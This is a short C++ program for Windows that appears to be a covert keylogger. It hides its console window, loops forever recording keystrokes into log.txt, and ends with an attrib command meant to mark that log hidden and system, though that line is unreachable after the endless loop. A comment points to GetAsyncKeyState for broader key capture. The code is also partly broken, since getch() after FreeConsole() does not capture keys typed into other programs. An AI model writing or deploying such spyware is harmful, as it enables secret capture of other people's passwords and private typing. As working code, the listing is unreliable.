#include <iostream>
#include <cstdio>
#include <cstdlib>
#include <conio.h>
#include <windows.h>

using namespace std;

void fil(char x)
{
	FILE* f;
	
	f=fopen("log.txt", "a");
	fprintf(f, "%c", x);
}

int main ()
{
	FreeConsole();
	
	do{
		char a;
	
		a=getch();	//GetAsyncKeyState
		fil(a);
	}
	while(1<5);
	
	system("attrib +h +s log.txt");
}
